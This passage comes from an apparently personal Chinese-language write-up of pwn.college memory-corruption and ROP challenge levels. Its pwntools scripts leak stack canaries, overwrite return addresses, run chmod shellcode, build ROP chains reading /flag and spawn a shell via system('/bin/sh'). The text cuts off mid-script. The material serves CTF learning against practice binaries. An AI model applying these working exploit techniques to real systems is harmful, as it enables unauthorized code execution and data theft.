=&gt; [&#39;0x2f&#39;, &#39;0x66&#39;, &#39;0x6c&#39;, &#39;0x61&#39;, &#39;0x67&#39;]</code> </li><li>没料到手写shellcode会有一堆的空字符. 放弃手写, 转为pwntool生成.</li><li>size写太大, REPEAT后面的换行符都给读进去了.</li><li>招架不住canary和rbp里面也有空字符…多试几次就行了</li><li>IDA变量定义错了, 存在一个指向字符数组的指针, read参数还出现了对buf的解引用, 半天没看出来.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#buf在rbp-0x38的位置, canary在rbp-0x8</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#binary = glob(&quot;/challenge/t*&quot;)[0]</span><br>binary = <span class="hljs-string">&quot;./toddlerone_level3.1.elf64&quot;</span><br>context.binary = binary<br>p = process(binary) <br><br><span class="hljs-comment">#第一次leak canary</span><br>p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;57&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;bytes)!\n&quot;</span>)<br>shellcode=shellcraft.amd64.chmod(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;0x04&#x27;</span>)<br>payload = asm(shellcode) <br>payload = payload.ljust(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>-<span class="hljs-number">6</span>+<span class="hljs-number">1</span>)<br>payload += <span class="hljs-string">b&#x27;REPEAT&#x27;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>canary = p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;canary&#x27;</span>+canary)<br><br><span class="hljs-comment">#第二次leak rbp</span><br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-string">b&#x27;64&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;REPEAT&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>rbp_byte = p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rbp = <span class="hljs-built_in">int</span>.from_bytes(rbp_byte, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;rbp = &#x27;</span>+<span class="hljs-built_in">hex</span>(rbp))<br><br><span class="hljs-comment">#第三次执行shellcode.</span><br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-string">b&#x27;200&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x38</span>+canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(rbp-<span class="hljs-number">0x40</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br></code></pre></div></td></tr></table></figure><h4 id="level4-2"><a href="#level4-2" class="headerlink" title="level4"></a>level4</h4><p>看起来和上一题没有什么区别, 就是88字节的数组末尾8字节要是一个确定的数字才能正常return.</p><p>%s没有限制. executable stack.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#几乎一样的代码, 不打出来了.</span><br></code></pre></div></td></tr></table></figure><h4 id="level5-3"><a href="#level5-3" class="headerlink" title="level5"></a>level5</h4><p>else repeat加了一个seccomp, 感觉又没什么区别.</p><h4 id="level6-3"><a href="#level6-3" class="headerlink" title="level6"></a>level6</h4><p>这下子真有区别了, seccomp在challenge返回的时候无法避免. 保护一样, 仍然是可执行栈.</p><p>只允许write和exit_group. 这是能做的吗? 一次load剩下的执行流程都会被限制.</p><p>没事了, 我连他的限制的内容也可以修改. 改成我想要的就行了. 总共允许两个syscall.</p><p>改成90 chmod 91 fchmod就行.</p><h4 id="level7-2"><a href="#level7-2" class="headerlink" title="level7"></a>level7</h4><p>加上了PIE. 利用随机地址仍然是4KB对齐来修改最后两个字节, 不过最高四位只能碰运气了(\x29中的’2’)</p><ul><li>使用vim编辑二进制文件直接把非print字符整成一个问号存起来……换个办法修改好了…..</li><li>要么使用编辑器, 要么vim中使用<code>set binary</code>或<code>-b</code>参数, 然后<code>%!xxd</code> </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">b&#x27;\xa4\x29&#x27;</span><br></code></pre></div></td></tr></table></figure><h4 id="level8-2"><a href="#level8-2" class="headerlink" title="level8"></a>level8</h4><p>heap上malloc一个size区域, 七八十字节, 但是在这个区域中使用strlen, 在一堆ped中加入一个空字符即可. </p><p>而且加了PIE. 如同上一题的做法.</p><h4 id="level9-2"><a href="#level9-2" class="headerlink" title="level9"></a>level9</h4><p>保护全开. <a href="https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro">RELRO</a> </p><p>最大的问题是开了canary.</p><p>嘶—-我知道了, 利用内存寻址可以跳过canary从而直接修改retaddr.</p><p>0x79下一个是0x80也是很可以. 下次写十六进制一定加前缀.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">92</span>+<span class="hljs-string">b&#x27;\x77\x1a\x3f&#x27;</span><br></code></pre></div></td></tr></table></figure><h4 id="level10-2"><a href="#level10-2" class="headerlink" title="level10"></a>level10</h4><p>已经将flag读到了栈上, 为了printf的%s能够打印出来, 把buf前面110个字节填充为非零, 紧接着就是flag内容, 这样%s的打印就不会在110处停止.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">110</span><br></code></pre></div></td></tr></table></figure><h4 id="level11-2"><a href="#level11-2" class="headerlink" title="level11"></a>level11</h4><p>保护全开, 这题是mmap的使用, 以前还没看过详细的机制. youtube的一个<a href="https://www.youtube.com/watch?v=8hVLcyBkSXY">视频</a>, 还不错.</p><p>一连几个mmap都是没有address hint的, 全都连在一起. 而且是向低地址方向map,  最后map的region反而在低地址.</p><img src="../../image/pwn-modules/image-20220426223702228.png" alt="image-20220426223702228" style="zoom:80%;" /><p>最后的map只指定了0x5c个字节, 不过还是分配了0x1000一整个page, 全为可写可读. <strong>没搞懂的是为什么/flag映射的是只能执行也可以被printf读取出来</strong>..</p><p>所以结果也很简单, 0x3000字节即可.</p><h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12"></a>level12</h4><p>仍然是全开.</p><p>能重复执行challenge, 难不成是leak canary? 而且还有printf %s.</p><ul><li>第一次0x19个(因为buf和canary之间有undefined区域)填充字符, leak出canary, 然后再次进入challenge</li><li>为了能跳转到win, 必须执行完challenge, 即通过canary验证. 第一次执行覆盖了canary第一字节必定不成功, 第二次利用leak出的canary来通过验证并且修改返回地址的低两字节.</li><li>这么一说感觉得用pwntools来写了.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    p = process(<span class="hljs-string">&#x27;./babymem_level12.1.elf64&#x27;</span>)<br><br>    p.sendline(<span class="hljs-string">b&#x27;25&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;REPEAT&#x27;</span>.rjust(<span class="hljs-number">0x20</span>-<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)<br>    p.sendline(pl)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>    canary = p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(canary)<br>    p.sendline(<span class="hljs-string">b&#x27;42&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;\xa4\x23&#x27;</span><br>    p.sendline(pl)                             <br><br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">all</span>)<br>        <span class="hljs-keyword">break</span><span class="hljs-comment">#一直试到成功为止.</span><br>    <span class="hljs-comment">#break</span><br></code></pre></div></td></tr></table></figure><h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13"></a>level13</h4><p>大满开!</p><p>重复利用没有清空的堆栈内容. flag在<code>rbp-0x10f</code>开始的0x100字节上. 所以在challenge栈帧中也从这个位置读取即可. 神奇的是有一大块空间没有被定义. 或许是定义了一个数组然后没有使用? 这样的话还不能被编译器优化掉.</p><p>v5从rbp-0x120开始, 填上0x20 byte is enough.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">17</span>                                                    <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/mnt/hgfs/LearingList/pwn.college/input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(<span class="hljs-string">b&#x27;17\n&#x27;</span>+pl)<br></code></pre></div></td></tr></table></figure><h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>也是leak canary, the problem is printf() function limit the number of bytes to be output to 452, while buf size if 456 bytes. </p><p>………….</p><h4 id="level15-1"><a href="#level15-1" class="headerlink" title="level15"></a>level15</h4><p>TCP连接, 利用fork的特点来绕过canary.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">tcp_socket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>udp_socket = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);<br>raw_socket = socket(AF_INET, SOCK_RAW, protocol);<br></code></pre></div></td></tr></table></figure><ul><li><a href="https://docs.pwntools.com/en/stable/tubes/sockets.html">https://docs.pwntools.com/en/stable/tubes/sockets.html</a>, exempli gratia:</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">8</span>]: <span class="hljs-keyword">import</span> pwn <br>   ...:  <br>   ...: pwn.context.encoding = <span class="hljs-string">&quot;latin-1&quot;</span> <br>   ...:  <br>   ...: <span class="hljs-keyword">with</span> pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level15.0&quot;</span>) <span class="hljs-keyword">as</span> target: <br>   ...:     <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote: <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-string">b&quot;100\n&quot;</span>) <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Send your payload&quot;</span>, <span class="hljs-string">b&quot;test&quot;</span>) <br>   ...:         pwn.info(remote.clean().decode()) <br>   ...:                                                                                                                                                       <br>[x] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span><br>[+] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span>: pid <span class="hljs-number">7046</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span>: Trying <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>[+] Opening connection to localhost on port <span class="hljs-number">1337</span>: Done<br>[*]  (up to <span class="hljs-number">100</span> <span class="hljs-built_in">bytes</span>)!<br>    You sent <span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span>!<br>    Let<span class="hljs-string">&#x27;s see what happened with the stack</span><br></code></pre></div></td></tr></table></figure><h1 id="module-A-rop"><a href="#module-A-rop" class="headerlink" title="module A-rop"></a>module A-rop</h1><p>ROP</p><ul><li>rp++, ROPgadget.<ul><li><code>rp++ --unique -r2 -f /bin/bash | grep -P &quot;(add|sub|mov) rax, r..&quot;</code> </li></ul></li><li>store addresses into registers</li><li>stack pivot: 栈转移.</li><li>data transfer.</li><li>USE INFO IN THE STACK OR REGISTERS.</li></ul><p>Counter-CFI(Control Flow Integrity) techniques:</p><ul><li><input disabled="" type="checkbox"> <strong>B(lock)OP:</strong> ROP on a block (or multi-block) level by carefully compensating for side-effects.</li><li><input checked="" disabled="" type="checkbox"> <strong>J(ump)OP:</strong> instead of returns, use indirect jumps to control execution flow</li><li><input checked="" disabled="" type="checkbox"> <strong>C(all)OP:</strong> instead of returns, use indirect calls to control execution flow</li><li><input checked="" disabled="" type="checkbox"> <strong>S(ignreturn)ROP:</strong> instead of returns, use the sigreturn system call </li><li><input disabled="" type="checkbox"> <strong>D(ata)OP:</strong> instead of hijacking control flow, carefully overwrite the program’s data to puppet it</li></ul><p><strong>Intel Edition(endbr64 after ret instruction)</strong> is still bypassable by some advanced ROP techniques (<u>Block Oriented Programming, SROP, etc</u>), but it will significantly complicate exploitation.</p><p><a href="http://www.scs.stanford.edu/brop/bittau-brop.pdf">Hacking blind</a>:</p><ul><li>The standard blind attack requires a <strong>forking service</strong>. 就像</li><li>Break ASLR and the canary byte-by-byte. Now we can redirect memory semi-controllably.</li><li>Redirect memory until we have a <em>survival signal</em> (i.e., an address that doesn’t crash).</li><li>Use the survival signal to find non-crashing ROP gadgets.</li><li>Find functionality to produce output.</li><li>Leak the program.</li><li>Hack it.</li></ul><p>所谓的libc.so.6其实也就是一个符号链接. 如果要更改libc文件直接临时修改一下符号链接<strong>还要注意ld和libc的匹配问题</strong>. 或者使用patchelf改一下, 链接<a href="https://bbs.pediy.com/thread-254868-1.htm">在这</a>. (那个glibc_all_in_one就在这儿用的)(成天用的都是工具, 真想自己写一个)</p><img src="../../image/pwn-modules/image-20220507102703295.png" alt="image-20220507102703295" style="zoom:80%;" /><blockquote><p>YouTube-42视频是rop的新用法… pwntool还内置了rop. 真行啊.</p></blockquote><h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1"></a>level1</h4><p>啥主要的保护也没开, 简单的覆盖返回地址.</p><h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h4><p>没开啥保护, 查了一下lseek的使用, 主要就是win函数分成了两个阶段, 一次读一半.</p><p>只要在栈上弄两个返回地址就行了. 简单</p><h4 id="level3-2"><a href="#level3-2" class="headerlink" title="level3"></a>level3</h4><p>5个stage, 每个stage都要有对应数字的参数, 简单跳过.</p><h4 id="level4-3"><a href="#level4-3" class="headerlink" title="level4"></a>level4</h4><p>有一整个函数用来提供gadgets.</p><img src="../../image/pwn-modules/image-20220505210342026.png" alt="image-20220505210342026" style="zoom:80%;" /><p>利用这几个gadgets就可以实现chmod系统调用了. (或者execve)</p><p>rdi是’/flag’字符串的地址, 存在栈上. 鉴于栈空间会不断的减少, 就存在challenge的栈帧中. </p><p>好吧, 这栈地址会变化的. 大意了, 栈帧底部有一个变量.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(binary)<br>p.recvuntil(<span class="hljs-string">b&#x27; at: 0x&#x27;</span>)<br>buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>rbp = buf + <span class="hljs-number">0x50</span><br>log.info(<span class="hljs-built_in">hex</span>(rbp))<br>sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">init-pwndbg</span><br><span class="hljs-string">si</span><br><span class="hljs-string">b *challenge+86</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>pl = flat([<span class="hljs-string">b&#x27;/flag\x00&#x27;</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">6</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0x4015fb</span>, buf, <span class="hljs-number">0x40161b</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x40160c</span>, <span class="hljs-number">90</span>, <span class="hljs-number">0x4015e3</span>])<br>p.sendline(pl)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h4 id="level5-4"><a href="#level5-4" class="headerlink" title="level5"></a>level5</h4><p>这一题在上一题的基础之上, 没有提示buf的所在位置.</p><p>突然想起来babyjail里面有一个openat. 我或许可以用<code>fchmodat</code>.</p><p>想出来了一个奇奇怪怪的方法, 在IDA中搜索到了字节序列<code>&#39;\x66\x00&#39;</code>, 就是字符串<code>f\0</code>的表示,<br>在这之前要先使用<code>ln -s /flag /home/hacker/f</code>命令来创建符号链接, 再使用python来生成input,<br>最后再命令行中这样执行文件<code>/challenge/babyrop_level5.1 &lt;input 6&lt;.</code>, 这样就行了.<br>或许可以使用别的字符串. 比如一些函数名.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#连续装四个参数和rax系统调用号.</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401d7b</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0x401d63</span>, <span class="hljs-number">0x403EC8</span>, <span class="hljs-number">0x401d5c</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x401d54</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401d74</span>, <span class="hljs-number">268</span>, <span class="hljs-number">0x401d8b</span>])<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(pl)<br></code></pre></div></td></tr></table></figure><p>想出来这个是因为不知道怎么leak栈上的地址, 估计下几个level得直接完蛋吧…….</p><p><del>看以前的ctf发现也许可以使用write函数来打印栈上的内容, 肯定有一个指向栈上的指针的. 比如说main的rbp.</del>没事了, write的地址也得是指向栈的指针, 属于是鸡和蛋的问题, 暂时没有新方法.</p><h4 id="level6-4"><a href="#level6-4" class="headerlink" title="level6"></a>level6</h4><p>这次没有了syscall, 只有一个现成的函数<code>force_import</code>, gadget也少了几个. 不过也简单. 保护没有变化.</p><img src="../../image/pwn-modules/image-20220506101348091.png" alt="image-20220506101348091" style="zoom:80%;" /><p>再加上challenge结束时的寄存器值:</p><img src="../../image/pwn-modules/image-20220506104816965.png" alt="image-20220506104816965" style="zoom:80%;" /><p>这样的话只要改改rdi rsi. (open多参数到底有没有问题???)</p><ul><li>但是rsi同时作为open的oflag和sendfile的in_fd, 按理来说open一般会开出来3, 那么oflag就得是3了, 但很明显不能是3, 这样标志位会有冲突. 那么用一个文件占用fd3, 这样就会开到4. 如果oflag是4的话会被识别为只读. </li><li>接下来就是rdi的问题, open的参数是一个指向字符串的地址(‘e’, null-terminal string at 0x400457), 还要被用在sendfile的out_fd中, 而fd是int类型, 加上文件固定低地址执行, 这样子还要在命令行中开一个fd为4195415(0x400457)的输出文件.</li></ul><p>然后发现bash并不能打开超过9的fd. 由操作系统分配的fd, bash是怎么控制的? 为什么只提供0-9?</p><p>一次执行这个函数有困难也可以执行两次.</p><ul><li>第一次open(‘e’, 4), send(‘f’, 4, 0, 0x7f……), sendfile失败.</li><li>第二次直接跳到sendfile(1, 3, 0, 60), 因为open函数会修改rdi rsi等等, 从函数入口开始执行的话ROP设置的寄存器值就失效了.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">0x8</span>), <span class="hljs-number">0x401b6a</span>, <span class="hljs-number">0x400458</span>, <span class="hljs-number">0x401b82</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x401B3F</span>])<br>pl+= flat([<span class="hljs-number">0x401b6a</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x401b82</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0x401b7a</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401b72</span>, <span class="hljs-number">60</span>, <span class="hljs-number">0x401B56</span>, <span class="hljs-number">0</span>])<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(pl)<br></code></pre></div></td></tr></table></figure><hr><ul><li>我开了aslr才能在gdb里面进行输入, 具体原因未知.</li><li>搞清楚了open的一些东西<ul><li>oflag用4字节中最低2bits表示, 按数值区别. mode参数只有在创建新文件的时候使用, <strong>一般可忽略</strong>.</li><li>libc中的open函数最终都会调用openat, 这样既能接受绝对地址也能接受相对地址.</li></ul></li></ul><h4 id="level7-3"><a href="#level7-3" class="headerlink" title="level7"></a>level7</h4><p>直接给我system函数的地址.</p><p>本地成功了, 现查system函数和/bin/sh字符串的偏移直接写出脚本, 但是远程不仅没法attach, 还不能strace, 明明就是那个偏移却运行不了. 难不成想让我用别的方法?</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level7.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br><span class="hljs-comment">#p = process(&#x27;ltrace &#x27;+binary, shell=True)</span><br>p = process(binary)<br>p.recvuntil(<span class="hljs-string">b&#x27;is: 0x&#x27;</span>)<br>sys_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>log.info(<span class="hljs-built_in">hex</span>(sys_addr))<br>binsh = sys_addr+<span class="hljs-number">0x13f112</span><br>sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *challenge+0x63</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">0x8</span>), <span class="hljs-number">0x401af3</span>, binsh, sys_addr])<br>p.sendline(pl)<br>p.sendline(<span class="hljs-string">b&#x27;cat /flag&#x27;</span>)<br>p.recvall()<br></code></pre></div></td></tr></table></figure><h4 id="level8-3"><a href="#level8-3" class="headerlink" title="level8"></a>level8</h4><p>本地成功了, 远程懒得试.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level8.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(binary)<br>elf = ELF(binary)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc-2.31.so&#x27;) 通过maps找到对应libc文件.</span><br>libc = ELF(<span class="hljs-string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;</span>) <span class="hljs-comment">#本地测试libc文件.</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>), <span 